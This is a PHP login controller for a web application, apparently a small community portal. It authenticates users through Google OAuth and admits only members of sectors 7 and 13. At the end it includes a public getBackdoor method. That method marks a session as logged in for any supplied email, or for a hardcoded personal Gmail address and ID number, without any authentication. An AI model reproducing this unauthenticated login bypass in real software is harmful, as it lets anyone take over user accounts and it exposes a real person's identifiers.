<?php

class LoginCtrl extends Ctrl
{

  public function get(Dao $dao)
  {

    require_once('vendor/Google/autoload.php');

    $client = new Google_Client();
    $client->setClientId(GOOGLE_CLIENT_ID);
    $client->setClientSecret(GOOGLE_CLIENT_SECRET);
    $client->setRedirectUri(GOOGLE_REDIRECT_URL);
    $client->addScope("email");
    $client->addScope("profile");

    if (isset($_GET['code'])) {
      $client->authenticate($_GET['code']);
      $_SESSION['access_token'] = $client->getAccessToken();
      header('Location: ' . filter_var(GOOGLE_REDIRECT_URL, FILTER_SANITIZE_URL));
      exit;
    }

    $service = new Google_Service_Oauth2($client);

    if (isset($_SESSION['access_token']) && $_SESSION['access_token']) {
      $client->setAccessToken($_SESSION['access_token']);

      $user = $service->userinfo->get(); //get user info 
      $email = $user->email;

      $db = new DBService();
      $db->setUserSession(Dao::construct(['email'=>$email, 'hof_id'=>-1,'state'=>'NEW']));

      $loginData = $db->getUserLoginData($email);
      if( is_null($loginData) ) {
        //$db->setUserSession($loginData);
          $this->do_redirect_with_message('login/out', 'Oops! can not recognize you. Please contact us.', $dao);
      } else {
        if( in_array( $loginData->sector, [7,13])  ) {
          $loginData->state = 'LINKED';
          $db->setUserSession($loginData);
        } else {
          $this->do_redirect_with_message('login/out', 'Oops! you seems not belong to sector 7/13. Please contact us.', $dao);
        }
      }
      // $hof_id = $this->getHOF($email);
      // if( $hof_id > 0 ) {
      //   $db->setUserSession($email, $hof_id);
      // } 

        $uri = $dao->home_uri . '/' . LANDING_PAGE;
        header('Location: ' . $uri);

    } else {
      $dao->authUrl = $client->createAuthUrl();
      $this->render('login', $dao);
    }

  }

  // public function getHOF($email)
  // {
  //   $hof_id = -1;
  //   $db = new DBService();
  //   $loginData = $db->getUserLoginData($email);

  //   if( is_null($loginData) ) {
  //     $db->addEmail($email);      
  //   } else {
  //       $hof_id = $loginData->ITS_No ?? -1;
  //   }

  //   return $loginData;
  // }

  public function getOut(Dao $dao) {
    $ssn = new Ssn();
    Ssn::destroy();
    $this->do_redirect('home', $dao);
  }

  public function getBackdoor(Dao $dao) {
    $email = $dao->email ?? 'hatim.kamaal@gmail.com';
    $hof = $dao->hof ?? '30359589';

    $db = new DBService();
    $loginData = $db->getUserLoginData($email);
    $loginData->state = 'LINKED';
    $db->setUserSession($loginData);

    // $ssn = new Ssn();
    // Ssn::destroy();
    // $db->setUserSession(Dao::construct(['email'=>$email, 'hof_id'=>$hof,'state'=>'NEW']));

    $this->do_redirect('home', $dao);
  }

}